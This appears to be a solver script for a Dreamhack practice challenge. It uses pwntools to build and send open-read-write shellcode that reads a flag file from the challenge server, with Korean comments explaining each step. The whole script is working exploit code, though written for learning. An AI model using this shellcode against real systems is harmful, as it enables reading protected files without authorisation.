from pwn import *

p = remote("host3.dreamhack.games", 18221)

# 쉘 코드 아키텍처 정보를 x86-64로 설정.
context.arch = "amd64"

# open할 flag 파일 path
path = "/home/shell_basic/flag_name_is_loooooong" 
# path는 현재 문자열이다.

shellcode = shellcraft.open(path)	# open("/home/shell_basic/flag_name_is_loooooong")
# shellcraft의 기능중 open(경로) 를 이용하면 즉시 셸코드를 짜서 저장해줌(어셈블리어)
# 이때 open의 결과인 fd는 rax에 저장됨


# open() 함수 결과는 rax 레지스터에 저장된다. → rax = fd
shellcode += shellcraft.read('rax', 'rsp', 0x30)	# read(fd, buf, 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)	# write(stdout, buf, 0x30)
# 여기까지 shellcode는 어셈블리코드를 문자형으로 표현한것이다. 사람이 읽음



shellcode = asm(shellcode)	# shellcode를 기계어로 변환
# 이과정을 통해 shellcode는 진짜로 바이트자료형이 된다. 사람이 못읽음 16진수 범벅

payload = shellcode    # payload = shellcode 이렇게 바이트 자료형을 넘겨줘야함
p.sendlineafter("shellcode: ", payload)    # "shellcode: "가 출력되면 payload + '\n'을 입력
print(p.recv(0x30))    # p가 출력하는 데이터를 0x30 Byte 까지 받아서 출력
